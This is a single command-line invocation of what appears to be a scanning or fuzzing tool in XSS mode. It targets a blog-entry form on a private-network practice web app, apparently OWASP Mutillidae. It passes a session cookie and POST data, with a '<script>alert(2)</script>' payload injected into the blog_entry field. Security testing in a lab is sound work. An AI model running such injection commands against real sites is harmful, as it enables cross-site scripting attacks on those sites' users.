py -2 main.py -t xss -u "http://192.168.1.175/owapp/index.php?page=add-to-your-blog.php" --cookie " showhints=0; PHPSESSID=6v3ecj1ffqislv49q1vfrjo2t5; neowize_user={%22id%22:%224eeb5bf2-24ac-4912-a67b-99c067e64561%22%2C%22version%22:1.2}" --post "csrf-token=&blog_entry=123&add-to-your-blog-php-submit-button=Save+Blog+Entry" -s "<script>alert(2)</script>" -p blog_entry  -o xss --proxy